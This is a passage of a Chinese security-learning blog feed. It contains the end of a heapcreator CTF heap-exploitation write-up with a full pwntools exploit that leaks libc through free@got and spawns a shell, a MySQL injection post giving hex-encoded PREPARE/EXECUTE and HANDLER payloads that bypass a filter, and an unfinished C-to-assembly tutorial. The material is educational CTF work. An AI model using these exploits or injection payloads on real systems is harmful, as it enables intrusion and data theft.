heap[1]d的值。<br>于是我们将new heap[1]指向new content[1]的指针改为free@got，这样，当我们输出new content[1]时，就会去输出free在内存中的地址，从而泄露libc基地址</p><pre class=" language-python"><code class="language-python">edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'/bin/sh\x00'</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token operator">+</span>  p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Content : "</span><span class="token punctuation">)</span>data <span class="token operator">=</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Done !"</span><span class="token punctuation">)</span>free_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> free_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span> <span class="token keyword">print</span> <span class="token string">"libc:"</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">)</span>system <span class="token operator">=</span> libc <span class="token operator">+</span> <span class="token number">0x45390</span></code></pre><p>此时堆结构如下<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/29.jpg" alt=""></p><p>最后我们将free@got修改为system@got，再free掉content[0]即可getshell</p><pre class=" language-python"><code class="language-python">edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>完整exp如下</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span>io<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./heapcreator'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#io=remote("node3.buuoj.cn",27942)</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'heapcreator'</span><span class="token punctuation">)</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'libc-2.23_x64.so'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">'bbbb'</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'/bin/sh\x00'</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token operator">+</span>  p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(io)</span>show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Content : "</span><span class="token punctuation">)</span>data <span class="token operator">=</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Done !"</span><span class="token punctuation">)</span>free_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> free_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span> <span class="token keyword">print</span> <span class="token string">"libc:"</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">)</span>system <span class="token operator">=</span> libc <span class="token operator">+</span> <span class="token number">0x45390</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 漏洞学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 堆漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL注入</title>
      <link href="/LawlietLW.github.io/2020/02/15/mysql-de-yi-xie-yu-chu-li-yu-ju/"/>
      <url>/LawlietLW.github.io/2020/02/15/mysql-de-yi-xie-yu-chu-li-yu-ju/</url>
      
        <content type="html"><![CDATA[<p>复习了一下SQL注入，发觉还很有一部分知识点没掌握，记录一下<br>以2019强网杯随便注为例，之前是用的更改列名和表名来做的，但相对于利用MySQL预处理语句来做要麻烦很多，先了解一下MySQL的预处理语句</p><a id="more"></a><pre class=" language-sql"><code class="language-sql">语法：定义预处理语句PREPARE stmt_name <span class="token keyword">FROM</span> preparable_stmt<span class="token punctuation">;</span>执行预处理语句<span class="token keyword">EXECUTE</span> stmt_name <span class="token punctuation">[</span><span class="token keyword">USING</span> <span class="token variable">@var_name</span> <span class="token punctuation">[</span><span class="token punctuation">,</span> <span class="token variable">@var_name</span><span class="token punctuation">]</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span><span class="token punctuation">;</span>删除<span class="token punctuation">(</span>释放<span class="token punctuation">)</span>定义{<span class="token keyword">DEALLOCATE</span> <span class="token operator">|</span> <span class="token keyword">DROP</span>} PREPARE stmt_name<span class="token punctuation">;</span><span class="token keyword">set</span>语句可用于向系统变量或用户变量赋值，针对用户变量的定义如下：<span class="token keyword">SET</span> <span class="token variable">@var_name</span> <span class="token operator">=</span> expr <span class="token punctuation">[</span><span class="token punctuation">,</span> <span class="token variable">@var_name</span> <span class="token operator">=</span> expr<span class="token punctuation">]</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre><p>简单来说，预定义语句就类似于C的define关键字<br>再来看题<br>我们已经知道了flag在1919810931114514表中<br><img src="/LawlietLW.github.io/2020/02/15/mysql-de-yi-xie-yu-chu-li-yu-ju/1.jpg" alt=""><br>不在我们当前表中，需要跨表查询，但能够查询的语句都被过滤掉了<br>这时我们可以利用预定义语句，如下</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">Set</span> <span class="token variable">@a</span><span class="token operator">=</span><span class="token number">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">#0x73656c656374202a2066726f6d20603139313938313039333131313435313460是select * from `1919810931114514`的16进制编码</span>Prepare x <span class="token keyword">from</span> <span class="token variable">@a</span><span class="token keyword">Execute</span> x</code></pre><p>第一句相当于把变量@a赋值为0x73656c656374202a2066726f6d20603139313938313039333131313435313460<br>第二句将@a预编译为x<br>第三句执行x<br><img src="/LawlietLW.github.io/2020/02/15/mysql-de-yi-xie-yu-chu-li-yu-ju/2.jpg" alt=""><br>可以获得flag</p><p>再来看另一种方法</p><pre class=" language-bash"><code class="language-bash">handler语句代替select查询mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中</code></pre><pre class=" language-sql"><code class="language-sql">语法结构<span class="token keyword">HANDLER</span> tbl_name <span class="token keyword">OPEN</span> <span class="token punctuation">[</span> <span class="token punctuation">[</span><span class="token keyword">AS</span><span class="token punctuation">]</span> alias<span class="token punctuation">]</span><span class="token keyword">HANDLER</span> tbl_name <span class="token keyword">READ</span> index_name { <span class="token operator">=</span> <span class="token operator">|</span> <span class="token operator">&lt;=</span> <span class="token operator">|</span> <span class="token operator">>=</span> <span class="token operator">|</span> <span class="token operator">&lt;</span> <span class="token operator">|</span> <span class="token operator">></span> } <span class="token punctuation">(</span>value1<span class="token punctuation">,</span>value2<span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span>    <span class="token punctuation">[</span> <span class="token keyword">WHERE</span> where_condition <span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token keyword">LIMIT</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">]</span><span class="token keyword">HANDLER</span> tbl_name <span class="token keyword">READ</span> index_name { <span class="token keyword">FIRST</span> <span class="token operator">|</span> <span class="token keyword">NEXT</span> <span class="token operator">|</span> <span class="token keyword">PREV</span> <span class="token operator">|</span> <span class="token keyword">LAST</span> }    <span class="token punctuation">[</span> <span class="token keyword">WHERE</span> where_condition <span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token keyword">LIMIT</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">]</span><span class="token keyword">HANDLER</span> tbl_name <span class="token keyword">READ</span> { <span class="token keyword">FIRST</span> <span class="token operator">|</span> <span class="token keyword">NEXT</span> }    <span class="token punctuation">[</span> <span class="token keyword">WHERE</span> where_condition <span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token keyword">LIMIT</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">]</span><span class="token keyword">HANDLER</span> tbl_name <span class="token keyword">CLOSE</span></code></pre><p>我用本地的sqli-lab的secruity库的users表来测试<br><img src="/LawlietLW.github.io/2020/02/15/mysql-de-yi-xie-yu-chu-li-yu-ju/3.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/02/15/mysql-de-yi-xie-yu-chu-li-yu-ju/4.jpg" alt=""><br>能够一行一行地读取表中的内容<br>再回到题目<br>我们的sql语句如下</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">handler</span> \<span class="token punctuation">`</span><span class="token number">1919810931114514</span>\<span class="token punctuation">`</span> <span class="token keyword">open</span> <span class="token keyword">as</span> <span class="token number">a</span> <span class="token keyword">handler</span> <span class="token number">a</span> <span class="token keyword">read</span> <span class="token keyword">next</span></code></pre><p><img src="/LawlietLW.github.io/2020/02/15/mysql-de-yi-xie-yu-chu-li-yu-ju/5.jpg" alt=""><br>同样能够读取flag</p><p>预编译语句说完了，再看到无列名注入</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL预处理 </tag>
            
            <tag> 无列名注入 </tag>
            
            <tag> order by盲注 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>动态规划的背包问题</title>
      <link href="/LawlietLW.github.io/2020/02/10/c-yu-yan-zai-hui-bian-zhong-de-biao-xian-xing-shi/"/>
      <url>/LawlietLW.github.io/2020/02/10/c-yu-yan-zai-hui-bian-zhong-de-biao-xian-xing-shi/</url>
      
        <content type="html"><![CDATA[<p>​        在做某些代码量比较大且比较杂的题时深感代码审计的吃力，基础还是不够扎实，比如vmpwn，虚拟机实现的功能翻译出来的伪C代码看的确实费力，从汇编层分析可能会更为清晰，所以打算将C语言中的一些常用代码转换成汇编代码分析一下，巩固一下基础</p><h2 id="demo1"><a href="#demo1" class="headerlink" title="demo1"></a>demo1</h2><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token operator">></span>b<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">switch</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">case</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">default</span><span class="token punctuation">:</span><span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>b<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>这个demo中有定义变量，函数调用，if判断，switch语句和for循环，看一看反汇编出来的main函数</p><pre class=" language-assembly"><code class="language-assembly">/*objdump --disassemble=main -M intel ./demo*/401186:    55                       push   rbp401187:    48 89 e5                 mov    rbp,rsp40118a:    48 83 ec 20              sub    rsp,0x2040118e:    64 48 8b 04 25 28 00     mov    rax,QWORD PTR fs:0x28401195:    00 00 401197:    48 89 45 f8              mov    QWORD PTR [rbp-0x8],rax40119b:    31 c0                    xor    eax,eax40119d:    48 8d 45 e8              lea    rax,[rbp-0x18]4011a1:    48 89 c6                 mov    rsi,rax4011a4:    bf 04 20 40 00           mov    edi,0x4020044011a9:    b8 00 00 00 00           mov    eax,0x04011ae:    e8 bd fe ff ff           call   401070 <__isoc99_scanf@plt>4011b3:    48 8d 45 ec              lea    rax,[rbp-0x14]4011b7:    48 89 c6                 mov    rsi,rax4011ba:    bf 04 20 40 00           mov    edi,0x4020044011bf:    b8 00 00 00 00           mov    eax,0x04011c4:    e8 a7 fe ff ff           call   401070 <__isoc99_scanf@plt>4011c9:    8b 55 e8                 mov    edx,DWORD PTR [rbp-0x18]4011cc:    8b 45 ec                 mov    eax,DWORD PTR [rbp-0x14]4011cf:    39 c2                    cmp    edx,eax4011d1:    7e 4e                    jle    401221 <main+0x9b>4011d3:    48 8d 45 f0              lea    rax,[rbp-0x10]4011d7:    48 89 c6                 mov    rsi,rax4011da:    bf 04 20 40 00           mov    edi,0x4020044011df:    b8 00 00 00 00           mov    eax,0x04011e4:    e8 87 fe ff ff           call   401070 <__isoc99_scanf@plt>4011e9:    8b 45 f0                 mov    eax,DWORD PTR [rbp-0x10]4011ec:    83 f8 02                 cmp    eax,0x24011ef:    74 18                    je     401209 <main+0x83>4011f1:    83 f8 03                 cmp    eax,0x34011f4:    74 1f                    je     401215 <main+0x8f>4011f6:    83 f8 01                 cmp    eax,0x14011f9:    74 02                    je     4011fd <main+0x77>4011fb:    eb 4d                    jmp    40124a <main+0xc4>4011fd:    bf 31 00 00 00           mov    edi,0x31401202:    e8 29 fe ff ff           call   401030 <putchar@plt>401207:    eb 41                    jmp    40124a <main+0xc4>401209:    bf 32 00 00 00           mov    edi,0x3240120e:    e8 1d fe ff ff           call   401030 <putchar@plt>401213:    eb 35                    jmp    40124a <main+0xc4>401215:    bf 33 00 00 00           mov    edi,0x3340121a:    e8 11 fe ff ff           call   401030 <putchar@plt>40121f:    eb 29                    jmp    40124a <main+0xc4>401221:    c7 45 f4 00 00 00 00     mov    DWORD PTR [rbp-0xc],0x0401228:    eb 18                    jmp    401242 <main+0xbc>40122a:    8b 45 f4                 mov    eax,DWORD PTR [rbp-0xc]40122d:    89 c6                    mov    esi,eax40122f:    bf 04 20 40 00           mov    edi,0x402004401234:    b8 00 00 00 00           mov    eax,0x0401239:    e8 12 fe ff ff           call   401050 <printf@plt>40123e:    83 45 f4 01              add    DWORD PTR [rbp-0xc],0x1401242:    8b 45 ec                 mov    eax,DWORD PTR [rbp-0x14]401245:    39 45 f4                 cmp    DWORD PTR [rbp-0xc],eax401248:    7e e0                    jle    40122a <main+0xa4>40124a:    b8 00 00 00 00           mov    eax,0x040124f:    48 8b 4d f8              mov    rcx,QWORD PTR [rbp-0x8]401253:    64 48 33 0c 25 28 00     xor    rcx,QWORD PTR fs:0x2840125a:    00 00 40125c:    74 05                    je     401263 <main+0xdd>40125e:    e8 dd fd ff ff           call   401040 <__stack_chk_fail@plt>401263:    c9                       leave  401264:    c3                       ret</code></pre><p>我们按照c代码的顺序来看，首先是<strong>scanf(“%d”,&amp;a);scanf(“%d”,&amp;b);</strong>，对应的汇编代码为</p><pre class=" language-assembly"><code class="language-assembly">40119d:    48 8d 45 e8              lea    rax,[rbp-0x18]4011a1:    48 89 c6                 mov    rsi,rax4011a4:    bf 04 20 40 00           mov    edi,0x4020044011a9:    b8 00 00 00 00           mov    eax,0x04011ae:    e8 bd fe ff ff           call   401070 <__isoc99_scanf@plt>4011b3:    48 8d 45 ec              lea    rax,[rbp-0x14]4011b7:    48 89 c6                 mov    rsi,rax4011ba:    bf 04 20 40 00           mov    edi,0x4020044011bf:    b8 00 00 00 00           mov    eax,0x04011c4:    e8 a7 fe ff ff           call   401070 <__isoc99_scanf@plt></code></pre><p>lea的作用是取地址，把$rbp-0x18存入rax中，这里就是变量<strong>a</strong>的地址，下一句就是传参了，64位程序传参顺序是rdi，rsi，rdx，scanf第一个参数是格式化字符串，<strong>mov    edi,0x402004</strong>这一句即是传参格式化字符串</p><p><img src="/LawlietLW.github.io/2020/02/10/c-yu-yan-zai-hui-bian-zhong-de-biao-xian-xing-shi/D:%5CHexo%5Csource_posts%5CC%E8%AF%AD%E8%A8%80%E5%9C%A8%E6%B1%87%E7%BC%96%E4%B8%AD%E7%9A%84%E8%A1%A8%E7%8E%B0%E5%BD%A2%E5%BC%8F%5C1.jpg" alt="1"></p><p>gdb调试可以确定</p><p>之后就是调用scanf函数了</p><p>再看到<strong>if(a&gt;b)</strong>这一句</p><pre class=" language-assembly"><code class="language-assembly">4011c9:    8b 55 e8                 mov    edx,DWORD PTR [rbp-0x18]4011cc:    8b 45 ec                 mov    eax,DWORD PTR [rbp-0x14]4011cf:    39 c2                    cmp    edx,eax4011d1:    7e 4e                    jle    401221 <main+0x9b></code></pre><p>将a的值放入edx，将b的值放入eax，然后比较edx和eax，jle即jmp less equal,小于等于就跳转，这样就直接跳转到了else语句处，我们先看else的代码块</p><pre class=" language-assembly"><code class="language-assembly">else    {        for(int i=0;i<=b;i++)            printf("%d",i);    }</code></pre><p>对应的汇编语句如下</p><pre class=" language-assembly"><code class="language-assembly">401221:    c7 45 f4 00 00 00 00     mov    DWORD PTR [rbp-0xc],0x0401228:    eb 18                    jmp    401242 <main+0xbc>40122a:    8b 45 f4                 mov    eax,DWORD PTR [rbp-0xc]40122d:    89 c6                    mov    esi,eax40122f:    bf 04 20 40 00           mov    edi,0x402004401234:    b8 00 00 00 00           mov    eax,0x0401239:    e8 12 fe ff ff           call   401050 <printf@plt>40123e:    83 45 f4 01              add    DWORD PTR [rbp-0xc],0x1401242:    8b 45 ec                 mov    eax,DWORD PTR [rbp-0x14]401245:    39 45 f4                 cmp    DWORD PTR [rbp-0xc],eax401248:    7e e0                    jle    40122a <main+0xa4></code></pre><p>首先定义变量i=0，<strong>mov    DWORD PTR [rbp-0xc],0x0</strong>，然后和变量b进行比较，</p><pre class=" language-assembly"><code class="language-assembly">401228:    eb 18                    jmp    401242 <main+0xbc>......401242:    8b 45 ec                 mov    eax,DWORD PTR [rbp-0x14]401245:    39 45 f4                 cmp    DWORD PTR [rbp-0xc],eax401248:    7e e0                    jle    40122a <main+0xa4></code></pre><p>将b的值存入eax，然后与i相比较，i&lt;=b即跳转</p><pre class=" language-assembly"><code class="language-assembly">40122a:    8b 45 f4                 mov    eax,DWORD PTR [rbp-0xc]40122d:    89 c6                    mov    esi,eax40122f:    bf 04 20 40 00           mov    edi,0x402004401234:    b8 00 00 00 00           mov    eax,0x0401239:    e8 12 fe ff ff           call   401050 <printf@plt>40123e:    83 45 f4 01              add    DWORD PTR [rbp-0xc],0x1</code></pre><p>这里就是调用printf函数，然后往下就有到了比较环节，循环</p><p>接下来我们再回过头看if语句的代码块</p><pre class=" language-assembly"><code class="language-assembly">4011d3:    48 8d 45 f0              lea    rax,[rbp-0x10]4011d7:    48 89 c6                 mov    rsi,rax4011da:    bf 04 20 40 00           mov    edi,0x4020044011df:    b8 00 00 00 00           mov    eax,0x04011e4:    e8 87 fe ff ff           call   401070 <__isoc99_scanf@plt>4011e9:    8b 45 f0                 mov    eax,DWORD PTR [rbp-0x10]4011ec:    83 f8 02                 cmp    eax,0x24011ef:    74 18                    je     401209 <main+0x83>4011f1:    83 f8 03                 cmp    eax,0x34011f4:    74 1f                    je     401215 <main+0x8f>4011f6:    83 f8 01                 cmp    eax,0x14011f9:    74 02                    je     4011fd <main+0x77>4011fb:    eb 4d                    jmp    40124a <main+0xc4>4011fd:    bf 31 00 00 00           mov    edi,0x31401202:    e8 29 fe ff ff           call   401030 <putchar@plt>401207:    eb 41                    jmp    40124a <main+0xc4>401209:    bf 32 00 00 00           mov    edi,0x3240120e:    e8 1d fe ff ff           call   401030 <putchar@plt>401213:    eb 35                    jmp    40124a <main+0xc4>401215:    bf 33 00 00 00           mov    edi,0x3340121a:    e8 11 fe ff ff           call   401030 <putchar@plt></code></pre><p>流程也是先定义变量c，然后调用scanf，然后将c的值存入eax，与1、2、3作比较，相等则跳转到对应的语句，其中<strong>break</strong>的汇编代码就是</p><p><strong>jmp    40124a &lt;main+0xc4&gt;</strong>，跳转到程序结尾</p><pre class=" language-assembly"><code class="language-assembly">40124a:    b8 00 00 00 00           mov    eax,0x040124f:    48 8b 4d f8              mov    rcx,QWORD PTR [rbp-0x8]401253:    64 48 33 0c 25 28 00     xor    rcx,QWORD PTR fs:0x2840125a:    00 00 40125c:    74 05                    je     401263 <main+0xdd>40125e:    e8 dd fd ff ff           call   401040 <__stack_chk_fail@plt>401263:    c9                       leave  401264:    c3                       ret</code></pre><p>这个简单的程序就差不多分析完了，这么分析下来汇编代码也并没有想象的那么难，都是有据可依的，比如调用函数先传参，if语句则是cmp之后跳转，switch语句也是多个比较和跳转语句，接下来我们看另一个小程序，结构体分析</p><h2 id="demo2"><a href="#demo2" class="headerlink" title="demo2"></a>demo2</h2><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">struct</span> person<span class="token punctuation">{</span>    <span class="token keyword">char</span> <span 